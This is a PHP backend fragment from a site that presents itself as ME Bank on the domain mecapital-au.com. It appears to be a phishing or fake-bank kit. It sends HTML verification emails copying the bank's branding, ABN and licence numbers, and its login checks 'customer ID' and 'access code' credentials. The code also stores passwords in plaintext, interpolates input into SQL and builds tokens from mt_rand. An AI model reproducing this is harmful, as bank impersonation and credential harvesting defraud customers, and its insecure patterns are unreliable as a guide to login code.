        $encode = base64_encode(base64_encode($filtermail));
        echo "1"."|"."../../R3/verify/auth/index.php?meauth=$encode";
    }
  }
}
// create account starts ends here
// resend mail starts here
if (isset($_POST['verifymail'])) {
    $email = cleanString($conn, $_POST['usermail']);
    if (!empty($email)) {
        $fetch = mysqli_query($conn, "SELECT * FROM `clients` WHERE email = '$email'");
        if (mysqli_num_rows($fetch) > 0) {
            $filtermail = strtolower($email);
            $filterfirstname = ucfirst($fetchedata['firstname']);
            $fetchedata = mysqli_fetch_array($fetch);
            $subj = ucfirst($fetchedata['firstname'])." Your Verification Link for ME Bank";
            $token = $fetchedata['token'];
            $firstname = ucfirst($fetchedata['firstname']);
            $tokenmain = $token."#".sha1(mt_rand());
            $year_mail = date('Y');
            $message = "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'> <html xmlns='http://www.w3.org/1999/xhtml' xmlns:o='urn:schemas-microsoft-com:office:office'> <head> <meta charset='UTF-8'> <meta content='width=device-width, initial-scale=1' name='viewport'> <meta name='x-apple-disable-message-reformatting'> <meta http-equiv='X-UA-Compatible' content='IE=edge'> <meta content='telephone=no' name='format-detection'> <title>Verify your account</title> <!--[if (mso 16)]> <style type='text/css'> a {text-decoration: none;} </style> <![endif]--> <!--[if gte mso 9]><style>sup { font-size: 100% !important; }</style><![endif]--> <!--[if gte mso 9]> <xml> <o:OfficeDocumentSettings> <o:AllowPNG></o:AllowPNG> <o:PixelsPerInch>96</o:PixelsPerInch> </o:OfficeDocumentSettings> </xml> <![endif]--> <style type='text/css'> #outlook a {padding:0; } .es-button {mso-style-priority:100!important; text-decoration:none!important; } a[x-apple-data-detectors] {color:inherit!important; text-decoration:none!important; font-size:inherit!important; font-family:inherit!important; font-weight:inherit!important; line-height:inherit!important; } .es-desk-hidden {display:none; float:left; overflow:hidden; width:0; max-height:0; line-height:0; mso-hide:all; } [data-ogsb] .es-button {border-width:0!important; padding:10px 20px 10px 20px!important; } [data-ogsb] .es-button.es-button-1 {padding:10px 20px!important; } @media only screen and (max-width:600px) {p, ul li, ol li, a { line-height:150%!important } h1, h2, h3, h1 a, h2 a, h3 a { line-height:120% } h1 { font-size:20px!important; text-align:center } h2 { font-size:18px!important; text-align:center } h3 { font-size:16px!important; text-align:center } .es-header-body h1 a, .es-content-body h1 a, .es-footer-body h1 a { font-size:20px!important } .es-header-body h2 a, .es-content-body h2 a, .es-footer-body h2 a { font-size:18px!important } .es-header-body h3 a, .es-content-body h3 a, .es-footer-body h3 a { font-size:16px!important } .es-menu td a { font-size:13px!important } .es-header-body p, .es-header-body ul li, .es-header-body ol li, .es-header-body a { font-size:22px!important } .es-content-body p, .es-content-body ul li, .es-content-body ol li, .es-content-body a { font-size:13px!important } .es-footer-body p, .es-footer-body ul li, .es-footer-body ol li, .es-footer-body a { font-size:10px!important } .es-infoblock p, .es-infoblock ul li, .es-infoblock ol li, .es-infoblock a { font-size:13px!important } *[class='gmail-fix'] { display:none!important } .es-m-txt-c, .es-m-txt-c h1, .es-m-txt-c h2, .es-m-txt-c h3 { text-align:center!important } .es-m-txt-r, .es-m-txt-r h1, .es-m-txt-r h2, .es-m-txt-r h3 { text-align:right!important } .es-m-txt-l, .es-m-txt-l h1, .es-m-txt-l h2, .es-m-txt-l h3 { text-align:left!important } .es-m-txt-r img, .es-m-txt-c img, .es-m-txt-l img { display:inline!important } .es-button-border { display:inline-block!important } a.es-button, button.es-button { font-size:13px!important; display:inline-block!important } .es-adaptive table, .es-left, .es-right { width:100%!important } .es-content table, .es-header table, .es-footer table, .es-content, .es-footer, .es-header { width:100%!important; max-width:600px!important } .es-adapt-td { display:block!important; width:100%!important } .adapt-img { width:100%!important; height:auto!important } .es-m-p0 { padding:0px!important } .es-m-p0r { padding-right:0px!important } .es-m-p0l { padding-left:0px!important } .es-m-p0t { padding-top:0px!important } .es-m-p0b { padding-bottom:0!important } .es-m-p20b { padding-bottom:20px!important } .es-mobile-hidden, .es-hidden { display:none!important } tr.es-desk-hidden, td.es-desk-hidden, table.es-desk-hidden { width:auto!important; overflow:visible!important; float:none!important; max-height:inherit!important; line-height:inherit!important } tr.es-desk-hidden { display:table-row!important } table.es-desk-hidden { display:table!important } td.es-desk-menu-hidden { display:table-cell!important } .es-menu td { width:1%!important } table.es-table-not-adapt, .esd-block-html table { width:auto!important } table.es-social { display:inline-block!important } table.es-social td { display:inline-block!important } } </style> </head> <body style='width:100%;font-family:arial, helvetica, sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;padding:0;Margin:0'> <div class='es-wrapper-color' style='background-color:#F6F6F6'> <!--[if gte mso 9]> <v:background xmlns:v='urn:schemas-microsoft-com:vml' fill='t'> <v:fill type='tile' color='#f6f6f6'></v:fill> </v:background> <![endif]--> <table class='es-wrapper' width='100%' cellspacing='0' cellpadding='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;padding:0;Margin:0;width:100%;height:100%;background-repeat:repeat;background-position:center top'> <tr> <td valign='top' style='padding:0;Margin:0'> <table class='es-header' cellspacing='0' cellpadding='0' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;background-color:transparent;background-repeat:repeat;background-position:center top'> <tr> <td align='center' style='padding:0;Margin:0'> <table class='es-header-body' cellspacing='0' cellpadding='0' bgcolor='#ffffff' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='padding:0;Margin:0;padding-top:20px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0;padding-top:10px;padding-bottom:15px;font-size:0px'><img src='https://mecapital-au.com/mailer_img/logo.png' alt style='display:block;border:0;outline:none;text-decoration:none;-ms-interpolation-mode:bicubic' width='60'></td> </tr> </table></td> </tr> </table></td> </tr> <tr> <td align='left' style='Margin:0;padding-top:10px;padding-bottom:10px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' style='padding:0;Margin:0'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:33px;color:#333333;font-size:22px'><strong>Verify your email address</strong></p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> <table cellpadding='0' cellspacing='0' class='es-content' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%'> <tr> <td align='center' style='padding:0;Margin:0'> <table bgcolor='#ffffff' class='es-content-body' align='center' cellpadding='0' cellspacing='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='Margin:0;padding-top:10px;padding-bottom:10px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0;padding-top:10px;padding-bottom:10px'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:21px;color:#333333;font-size:14px'>Hello $filterfirstname,<br><br>You recently opened an account with ME Bank with the email address $filtermail. Click the button below this email to check that this email address belongs to you, doing so will help secure you account</p></td> </tr> <tr> <td align='left' style='padding:0;Margin:0;padding-top:20px;padding-bottom:20px'><span class='es-button-border' style='border-style:solid;border-color:#000000;background:#000000;border-width:0px;display:inline-block;border-radius:3px;width:auto'><a href='https://mecapital-au.com/auth/R3/auth.php?token=$tokenmain' class='es-button es-button-1' target='_blank' style='mso-style-priority:100 !important;text-decoration:none;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;color:#FFFFFF;font-size:14px;border-style:solid;border-color:#000000;border-width:10px 20px;display:inline-block;background:#000000;border-radius:3px;font-family:arial, helvetica, sans-serif;font-weight:normal;font-style:normal;line-height:17px;width:auto;text-align:center'>Verify email address</a></span></td> </tr> <tr> <td align='left' style='padding:0;Margin:0;padding-top:10px;padding-bottom:10px'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:21px;color:#333333;font-size:14px'>Button not working? Copy and paste the following URL into your browser.<br><br>https://mecapital-au.com/auth/R3/auth.php?token=$tokenmain<br><br><strong>Why did you receive this email?</strong><br>ME Bank requires verification whenever an email is selected for your ME Bank account. This email cannot be used until you have verified it. <br><br>Please ignore this email if you did not initiate it.<br><br>Kind regards,<br>ME Bank Support<br></p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> <table cellpadding='0' cellspacing='0' class='es-footer' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;background-color:transparent;background-repeat:repeat;background-position:center top'> <tr> <td align='center' style='padding:0;Margin:0'> <table bgcolor='#ffffff' class='es-footer-body' align='center' cellpadding='0' cellspacing='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='Margin:0;padding-left:20px;padding-right:20px;padding-top:25px;padding-bottom:30px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' style='padding:0;Margin:0'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:18px;color:#333333;font-size:12px'>Copyright &#169; $year_mail ME Bank, Inc. All Rights Reserved.<br>ME Bank Queensland Limited ABN 32 009 656 740 AFSL and Australian Credit Licence Number 244616.</p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> </div> </body> </html>";
            $mail = mailer($mail, 'noreply@mecapital-au.com', $filtermail, $subj, $message);
            echo "mail_sent";
        }
        else{
            echo "null";
        }
    }
    else{
        echo "null";
    }
}
// resend mail starts here ends here
// login function starts here
if (isset($_POST['pysignin'])) {
	$username = cleanString($conn, $_POST['username']);
	$password = cleanString($conn, $_POST['password']);
	$encrpt = $password;
  $check = mysqli_query($conn, "SELECT * FROM clients WHERE customer_id='$username' AND access_code ='$encrpt'");
	if(mysqli_num_rows($check) > 0){
		$result = mysqli_fetch_array($check);
		if($result['email_verified'] == "Y" && $result['account_status'] == 'Y' && $result['account_state'] == 'active'){
		    $_SESSION['userid'] = $result['email'];
		    echo "1";
		}
		elseif ($result['email_verified'] == "N") {
        $filtermail = strtolower($result['email']);
        $encode = base64_encode(base64_encode($filtermail));
        echo "2"."|"."../R3/verify/auth/index.php?meauth=$encode";
		}
		elseif ($result['email_verified'] == "Y" && $result['account_status'] == 'N') {
		    echo "Your account verification in progress, we will notify you once this is done";
		}
		elseif ($result['email_verified'] == "Y" && $result['account_state'] == 'deleted') {
		    echo "Your account is currently deleted. Get in touch Monday to Friday 8am-8pm or Saturday 9am-5pm (AEST) - we'll get you sorted ASAP.";
		}
		elseif ($result['email_verified'] == "Y" && $result['account_state'] == 'deactivated') {
		    echo "Your account is currently deactivated. Get in touch, Monday to Friday 8am-8pm or Saturday 9am-5pm (AEST) - we'll get you sorted ASAP.";
		}
		else{
			echo "System Error.";
		}
	}
	else{
		echo "Your customer ID or access code didn’t match, try again.";
	}

}
// login function ends here
?>